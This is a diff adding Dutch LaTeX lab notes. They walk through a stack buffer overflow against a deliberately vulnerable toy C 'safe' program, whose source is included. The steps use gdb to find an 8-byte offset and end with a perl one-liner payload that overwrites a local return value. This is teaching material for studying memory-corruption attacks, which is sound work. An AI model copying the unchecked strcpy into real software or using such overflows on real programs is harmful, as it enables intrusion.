@@ -1,0 +1,92 @@
+\begin{enumerate}
+  \item gcc -g -fno-stack-protector -z execstack -o cracking-safe cracking-safe.c
+  \item gdb -q cracking-safe
+  \item (gdb) list
+  	\begin{enumerate}
+  	\item Door dit commando uit te voeren krijgen we een overzicht van de programma code
+  	\item We zoeken de scharnierpunten in dit programma:
+  		\begin{enumerate}
+  		\item 1 argument: \textless paswoord\textgreater
+  		\item return\_value == 0
+  		\item password == argv[1]
+  		\item strcmp(password, "") == 0 --\textgreater succes
+  			\begin{enumerate}
+  			\item Lege String als argument meegeven gaat niet
+  			\end{enumerate}
+  		\end{enumerate}
+  	\end{enumerate}
+  \item (gdb) break 8
+  		\begin{enumerate}
+  		\item Adressen van password en return\_value  			
+  		\end{enumerate}
+  \item (gdb) break 10
+  		\begin{enumerate}
+  		\item Controleren of overflow gelukt is  			
+  		\end{enumerate}
+  \item (gdb) run azer
+  		\item (gdb) x/x \&return\_value
+  			\begin{enumerate}
+  			\item 0xbffff65c
+  			\end{enumerate}
+  		\item (gdb) x/x password
+  			\begin{enumerate}
+  			\item 0xbffff654
+  			\end{enumerate}
+  	\item (gdb) print 0xbffff65c - 0xbffff654
+  		\begin{enumerate}
+  		\item \$1 = 8
+  		\end{enumerate}
+  	\item (gdb) run azertyuip
+  	\item (gdb) cont
+  	\item (gdb) x/x \&return\_value
+  		\begin{enumerate}
+  		\item 0xbffff64c: 0x00000070
+  		\item return\_value is overschreven en zal geen 0 meer teruggeven.
+  		\end{enumerate}
+  	\item (gdb) quit
+  	\item ./cracking-safe ``\$(perl -e `print ``A''x8 . ``B'' ')''
+\end{enumerate}
+
+\begin{lstlisting}
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int check_safe(char *pass){
+	int return_value = 0;
+	char password[8];
+
+	strcpy(password, pass);
+
+	if(strcmp(password, "") == 0)
+		return_value = 1;
+
+	return return_value;
+}
+
+int main(int argc, char *argv[]) {
+	if(argc < 2){
+		printf("Fout!\nGebruik: %s <password>\n", argv[0]);
+		exit(0);
+	}
+
+	if(strlen(argv[1]) == 0){
+		printf("Fout!\nHet passwoord mag niet leeg zijn.\n");
+		exit(0);
+	}
+
+	if(check_safe(argv[1])){
+		printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
+		printf(" Successfully cracked the safe.\n");
+		printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
+		printf("Er staan momenteel 4 examens in de kluis:\n\n");
+		printf("1) Besturingssystemen 1     P. Geens          [Open]\n");
+		printf("2) Besturingssystemen 2     P. Geens          [Open]\n");
+		printf("3) Databanken 2             W. Bertels        [Open]\n");
+		printf("4) Beveiliging              P. Philippaerts   [Open]\n");
+
+	}else{
+		printf("\nSafe still closed.\n");
+	}
+}
+\end{lstlisting}
